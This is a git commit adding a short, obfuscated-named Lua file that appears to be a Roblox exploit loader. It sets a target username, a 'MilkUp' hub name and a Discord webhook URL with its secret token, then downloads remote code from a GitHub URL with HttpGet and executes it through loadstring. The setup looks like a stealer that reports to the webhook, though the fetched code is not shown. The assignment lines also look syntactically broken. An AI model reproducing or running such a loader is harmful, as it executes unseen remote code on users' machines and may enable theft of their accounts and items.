106a5823e76e17ac946909c2ff1b217ba239057d
heavenScript <134808813+heavenScript@users.noreply.github.com>
2023-05-28 19:01:34 +0300

    Add files via upload

---
+++ obf_Ij79FX154XtU9yy5XeOG10h8b2ExnoPWiqW9ssHHJx4Y8b04ZjN0jgqtvc6foolT.lua
@@ -0,0 +1,5 @@
+_G.Username "httpheavennotreal"
+_G.HubName "MilkUp"
+_G.WebhookUrl "https://discord.com/api/webhooks/1112391904361992192/pj9QlXFBk6TJk4nRkF3P8MmNXeHhtBQ-j7QE76e1QQPM9UUVIQOHiZY10Ya4DKQWqNJG"
+
+loadstring(game:HttpGet("https://github.com/Jayiioceanii/PeakOnTop/blob/main/peak.lua"))()
